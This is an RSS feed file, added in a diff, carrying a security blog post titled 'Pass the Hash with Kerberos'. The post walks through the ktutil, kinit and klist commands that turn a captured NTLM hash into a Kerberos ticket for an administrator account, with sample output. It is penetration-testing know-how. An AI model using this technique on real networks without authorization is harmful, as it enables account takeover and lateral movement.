@@ -1,0 +1,67 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Pth on </title>
+    <link>https://malicious.link/tags/pth/</link>
+    <description>Recent content in Pth on </description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Tue, 24 Jul 2018 08:30:44 -0500</lastBuildDate>
+    
+        <atom:link href="https://malicious.link/tags/pth/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Pass the Hash with Kerberos</title>
+      <link>https://malicious.link/post/2018/pass-the-hash-with-kerberos/</link>
+      <pubDate>Tue, 24 Jul 2018 08:30:44 -0500</pubDate>
+      
+      <guid>https://malicious.link/post/2018/pass-the-hash-with-kerberos/</guid>
+      <description>&lt;p&gt;This blog post may be of limited use, most of the time that you have a NTLM hash you have the tools to use it. But, if you find yourself in a situation where you don&amp;rsquo;t have to tools and do have kerberos tools, you can pass the hash with it.&lt;/p&gt;
+
+&lt;p&gt;Lets say with have the NTLM hash for the user &lt;code&gt;uberuser&lt;/code&gt; and the hash is &lt;code&gt;88e4d9fabaecf3dec18dd80905521b29&lt;/code&gt;. The first step to do so is to create a keytab file using &lt;code&gt;ktutil&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@wpad:~# ktutil
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;At the &lt;code&gt;ktutil&lt;/code&gt; prompt, type in the &amp;ldquo;add entry&amp;rdquo; (&lt;code&gt;addent&lt;/code&gt;) command with the &amp;ldquo;principle&amp;rdquo; (&lt;code&gt;-p&lt;/code&gt;) flag. Specify the user and an all upercase version of the FQDN. Then the &amp;ldquo;KVNO&amp;rdquo; (&lt;code&gt;-k 1&lt;/code&gt;), which is the key number. Finally the encryption type, which is &lt;code&gt;rc4-hmac&lt;/code&gt; for NTLM hashes:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ktutil: addent -p administrator@CORP.SOMEWHATREALNEWS.COM -k 1 -key -e rc4-hmac
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After you hit enter you&amp;rsquo;ll get prompted for the rc4-hmac (NTLM) hash:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Key for administrator@CORP.SOMEWHATREALNEWS.COM (hex): 88e4d9fabaecf3dec18dd80905521b29
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then we write the keytab file to disk and exit &lt;code&gt;ktutil&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ktutil: wkt /tmp/a.keytab
+ktutil: exit
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The last step before we can use our authentication it to create a kerberos ticket using out keytab file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@wpad:~# kinit -V -k -t /tmp/a.keytab -f administrator@CORP.SOMEWHATREALNEWS.COM
+Using default cache: /tmp/krb5cc_0
+Using principal: administrator@CORP.SOMEWHATREALNEWS.COM
+Using keytab: /tmp/a.keytab
+Authenticated to Kerberos v5
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Validate it with &lt;code&gt;klist&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@wpad:~# klist
+Ticket cache: FILE:/tmp/krb5cc_0
+Default principal: administrator@CORP.SOMEWHATREALNEWS.COM
+
+Valid starting       Expires              Service principal
+07/22/2018 21:38:43  07/23/2018 07:38:43  krbtgt/CORP.SOMEWHATREALNEWS.COM@CORP.SOMEWHATREALNEWS.COM
+	renew until 07/23/2018 21:38:40
+
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
